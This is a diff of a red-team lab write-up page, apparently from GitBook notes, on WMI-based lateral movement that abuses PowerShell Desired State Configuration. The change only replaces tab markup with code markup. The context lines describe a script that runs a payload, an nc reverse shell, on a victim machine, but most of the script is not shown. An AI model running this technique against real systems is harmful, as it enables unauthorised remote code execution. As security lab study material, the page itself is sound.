@@ -10,8 +10,7 @@ This lab is simply a test of the lateral movement technique desrcibed by Matt Gr
 
 Below is the powershell script that allows an attacker to execute code on a remote machine via WMI. Note that the payload is defined in the variable `TestScript` on line 7. In our case, the payload is a rudimentary nc reverse shell \(luckily, we know the victim has nc on their machine :\):
 
-{% tabs %}
-{% tab title="dsc.ps1" %}
+{% code title="dsc.ps1" %}
 ```csharp
 # Credits to Matt Graeber. Code taken from https://posts.specterops.io/abusing-powershell-desired-state-configuration-for-lateral-movement-ca42ddbe6f06
 $MOFContents = @'
@@ -89,8 +88,7 @@ if ($LCMClass -and $LCMClass.CimClassMethods['ResourceTest']) {
 	Write-Warning 'The DSC lateral movement method is not available on the remote system.'
 }
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 The technique is captured in action in a gif below. On the left is the attacking system, on the right is the victim system and the window above the victim screen is another attacking system that is receiving the reverse shell:
 
